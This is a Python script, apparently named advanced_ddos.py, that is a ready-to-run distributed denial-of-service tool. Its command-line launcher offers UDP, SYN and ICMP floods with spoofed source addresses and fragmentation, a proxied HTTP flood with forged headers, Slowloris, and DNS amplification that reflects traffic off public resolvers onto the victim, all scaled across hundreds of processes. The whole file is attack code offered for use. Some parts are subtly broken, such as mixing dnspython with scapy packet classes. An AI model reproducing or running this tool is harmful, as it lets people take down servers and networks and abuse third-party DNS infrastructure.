import socket
import random
import time
import os
import sys
import multiprocessing
from http.client import HTTPConnection
from scapy.all import IP, TCP, ICMP, UDP, send, RandShort, fragment, Raw
import psutil
import threading
import subprocess
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
import dns.resolver
import ssl
import requests
from fake_useragent import UserAgent

console = Console()
packet_counter = multiprocessing.Value('i', 0)
stop_event = multiprocessing.Event()

class AttackVector:
    def __init__(self, target_ip, target_port, counter):
        self.target_ip = target_ip
        self.target_port = target_port
        self.counter = counter
        self.proxy_list = self.load_proxies()
        self.user_agents = UserAgent()

    def load_proxies(self):
        try:
            with open('proxies.txt', 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return []

    def get_random_proxy(self):
        return random.choice(self.proxy_list) if self.proxy_list else None

    def run(self):
        raise NotImplementedError("Implement in subclass.")


class AdvancedUDPFlood(AttackVector):
    def run(self):
        payloads = [
            random._urandom(1024),
            bytes.fromhex('00' * 1024),
            bytes.fromhex('FF' * 1024),
            b'\x00' * 1024
        ]
        
        while not stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
                
                # Randomize source port and IP
                src_port = random.randint(1024, 65535)
                src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
                
                # Create raw packet
                packet = IP(src=src_ip, dst=self.target_ip)/UDP(sport=src_port, dport=self.target_port)/Raw(random.choice(payloads))
                
                # Fragment packets randomly
                if random.random() > 0.7:
                    frags = fragment(packet)
                    for frag in frags:
                        send(frag, verbose=0)
                        with self.counter.get_lock():
                            self.counter.value += 1
                else:
                    send(packet, verbose=0)
                    with self.counter.get_lock():
                        self.counter.value += 1
                
                sock.close()
            except:
                pass


class AdvancedSYNFlood(AttackVector):
    def run(self):
        while not stop_event.is_set():
            try:
                # Randomize all possible fields
                src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
                src_port = random.randint(1024, 65535)
                seq_num = random.randint(0, 4294967295)
                window = random.randint(5840, 65535)
                
                ip_layer = IP(src=src_ip, dst=self.target_ip, id=random.randint(1, 65535), ttl=random.randint(30, 255))
                tcp_layer = TCP(sport=src_port, dport=self.target_port, flags="S", seq=seq_num, window=window)
                
                # Add random options
                if random.random() > 0.5:
                    tcp_layer.options = [('MSS', random.randint(536, 1460))]
                
                packet = ip_layer / tcp_layer
                
                # Fragment 30% of packets
                if random.random() > 0.7:
                    frags = fragment(packet)
                    for frag in frags:
                        send(frag, verbose=0)
                        with self.counter.get_lock():
                            self.counter.value += 1
                else:
                    send(packet, verbose=0)
                    with self.counter.get_lock():
                        self.counter.value += 1
            except:
                pass


class AdvancedICMPFlood(AttackVector):
    def run(self):
        payloads = [
            random._urandom(64),
            bytes.fromhex('08' * 64),
            bytes.fromhex('00' * 64)
        ]
        
        while not stop_event.is_set():
            try:
                src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
                
                # Create different ICMP types
                icmp_type = random.choice([8, 13, 15, 17])  # Echo, Timestamp, Info, Addr Mask
                packet = IP(src=src_ip, dst=self.target_ip, id=random.randint(1, 65535))/ICMP(type=icmp_type)/Raw(random.choice(payloads))
                
                # Fragment 20% of packets
                if random.random() > 0.8:
                    frags = fragment(packet)
                    for frag in frags:
                        send(frag, verbose=0)
                        with self.counter.get_lock():
                            self.counter.value += 1
                else:
                    send(packet, verbose=0)
                    with self.counter.get_lock():
                        self.counter.value += 1
            except:
                pass


class AdvancedHTTPFlood(AttackVector):
    def run(self):
        paths = [
            "/", "/wp-admin", "/api/v1", "/search", "/images",
            "/css/style.css", "/js/main.js", "/.env", "/config.php"
        ]
        
        headers_list = [
            {"X-Forwarded-For": lambda: f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"},
            {"User-Agent": lambda: self.user_agents.random},
            {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"},
            {"Accept-Language": "en-US,en;q=0.5"},
            {"Accept-Encoding": "gzip, deflate, br"},
            {"Connection": "keep-alive"},
            {"Cache-Control": "max-age=0"},
            {"Referer": lambda: f"https://www.google.com/search?q={random.randint(100000,999999)}"}
        ]
        
        while not stop_event.is_set():
            try:
                # Use proxy if available
                proxy = self.get_random_proxy()
                proxies = {"http": proxy, "https": proxy} if proxy else None
                
                # Build dynamic headers
                headers = {}
                for header in random.sample(headers_list, random.randint(3, len(headers_list))):
                    key = list(header.keys())[0]
                    value = header[key]
                    headers[key] = value() if callable(value) else value
                
                # Random HTTP method
                method = random.choice(["GET", "POST", "HEAD", "PUT", "DELETE"])
                
                if method == "POST":
                    data = {"random": random.randint(100000, 999999)}
                    requests.request(
                        method,
                        f"http://{self.target_ip}:{self.target_port}{random.choice(paths)}",
                        headers=headers,
                        proxies=proxies,
                        data=data,
                        timeout=2,
                        verify=False
                    )
                else:
                    requests.request(
                        method,
                        f"http://{self.target_ip}:{self.target_port}{random.choice(paths)}",
                        headers=headers,
                        proxies=proxies,
                        timeout=2,
                        verify=False
                    )
                
                with self.counter.get_lock():
                    self.counter.value += 1
            except:
                pass


class SlowLoris(AttackVector):
    def run(self):
        headers = [
            "User-Agent: {}".format(self.user_agents.random),
            "Accept-language: en-US,en,q=0.5",
            "Connection: keep-alive",
            "Keep-Alive: {}".format(random.randint(100, 500))
        ]
        
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target_ip, self.target_port))
                
                s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode())
                for header in headers:
                    s.send("{}\r\n".format(header).encode())
                
                # Send partial headers
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                
                while not stop_event.is_set():
                    s.send("X-b: {}\r\n".format(random.randint(1, 5000)).encode())
                    time.sleep(random.randint(10, 100)/100)
                    with self.counter.get_lock():
                        self.counter.value += 1
            except:
                s.close()


class DNSAmplification(AttackVector):
    def __init__(self, target_ip, target_port, counter):
        super().__init__(target_ip, target_port, counter)
        self.dns_servers = self.load_dns_servers()
    
    def load_dns_servers(self):
        try:
            with open('dns_servers.txt', 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return [
                '8.8.8.8', '8.8.4.4',  # Google
                '1.1.1.1', '1.0.0.1',  # Cloudflare
                '9.9.9.9',  # Quad9
                '208.67.222.222',  # OpenDNS
                '64.6.64.6'  # Verisign
            ]
    
    def run(self):
        query_types = ['ANY', 'A', 'AAAA', 'MX', 'TXT']
        domains = [
            'example.com', 'google.com', 'youtube.com',
            'facebook.com', 'twitter.com', 'amazon.com'
        ]
        
        while not stop_event.is_set():
            try:
                dns_server = random.choice(self.dns_servers)
                resolver = dns.resolver.Resolver()
                resolver.nameservers = [dns_server]
                resolver.timeout = 1
                resolver.lifetime = 1
                
                query_type = random.choice(query_types)
                domain = random.choice(domains)
                
                # Spoof source IP as target
                src_ip = self.target_ip
                src_port = random.randint(1024, 65535)
                
                # Create DNS query packet
                dns_query = IP(dst=dns_server, src=src_ip)/UDP(sport=src_port, dport=53)/dns.DNS(
                    qd=dns.DNSQR(qname=domain, qtype=query_type),
                    aa=1,
                    rd=1
                )
                
                send(dns_query, verbose=0)
                with self.counter.get_lock():
                    self.counter.value += 1
            except:
                pass


def monitor_traffic(counter):
    old_stats = psutil.net_io_counters()
    while not stop_event.is_set():
        time.sleep(1)
        new_stats = psutil.net_io_counters()
        sent = (new_stats.bytes_sent - old_stats.bytes_sent) / (1024 * 1024)
        recv = (new_stats.bytes_recv - old_stats.bytes_recv) / (1024 * 1024)
        old_stats = new_stats
        console.log(f"[Monitor] Sent: {sent:.2f} MB/s | Received: {recv:.2f} MB/s | Packets Sent: {counter.value}")


def gui_progress(counter):
    with Progress(
        SpinnerColumn(),
        TextColumn("[bold green]Flooding..."),
        BarColumn(),
        TimeElapsedColumn(),
        TextColumn("[bold cyan]{task.description}"),
        transient=True,
    ) as progress:
        task = progress.add_task("Packets", description="Launching", total=None)
        while not stop_event.is_set():
            progress.update(task, description=f"Packets Sent: {counter.value}")
            time.sleep(0.1)


def attack(vector_class, target_ip, target_port, counter, processes=100):
    processes = min(processes, 500)  # Safety limit
    for _ in range(processes):
        p = multiprocessing.Process(target=vector_class(target_ip, target_port, counter).run)
        p.daemon = True
        p.start()


def signal_handler(sig, frame):
    console.print("\n[bold red]Stopping all attacks...[/bold red]")
    stop_event.set()
    time.sleep(2)  # Give time for cleanup
    sys.exit(0)


def main():
    if len(sys.argv) < 4:
        print("Usage: python3 advanced_ddos.py <vector> <ip> <port> [processes]")
        print("Available vectors:")
        print("  udp      - Advanced UDP Flood")
        print("  syn      - Advanced SYN Flood")
        print("  icmp     - Advanced ICMP Flood")
        print("  http     - Advanced HTTP Flood")
        print("  slow     - Slowloris Attack")
        print("  dns      - DNS Amplification")
        print("  all      - Combined attack (all vectors)")
        sys.exit(1)

    vector_type = sys.argv[1].lower()
    target_ip = sys.argv[2]
    target_port = int(sys.argv[3])
    processes = int(sys.argv[4]) if len(sys.argv) > 4 else 100

    vector_map = {
        "udp": AdvancedUDPFlood,
        "syn": AdvancedSYNFlood,
        "icmp": AdvancedICMPFlood,
        "http": AdvancedHTTPFlood,
        "slow": SlowLoris,
        "dns": DNSAmplification
    }

    if vector_type not in vector_map and vector_type != "all":
        print(f"Invalid vector type: {vector_type}")
        sys.exit(1)

    console.print(f"⚡ [bold red]Starting attack on {target_ip}:{target_port}[/bold red] ⚡")

    # Set up signal handler for graceful exit
    import signal
    signal.signal(signal.SIGINT, signal_handler)

    # Start monitoring threads
    threading.Thread(target=monitor_traffic, args=(packet_counter,), daemon=True).start()
    threading.Thread(target=gui_progress, args=(packet_counter,), daemon=True).start()

    if vector_type == "all":
        for vec in vector_map.values():
            attack(vec, target_ip, target_port, packet_counter, processes//len(vector_map))
    else:
        attack(vector_map[vector_type], target_ip, target_port, packet_counter, processes)

    # Keep main thread alive
    while not stop_event.is_set():
        time.sleep(1)


if __name__ == "__main__":
    # Check for root on Linux
    if os.name == 'posix' and os.geteuid() != 0:
        console.print("[bold red]Error: This script requires root privileges for raw socket operations[/bold red]")
        sys.exit(1)
    
    main()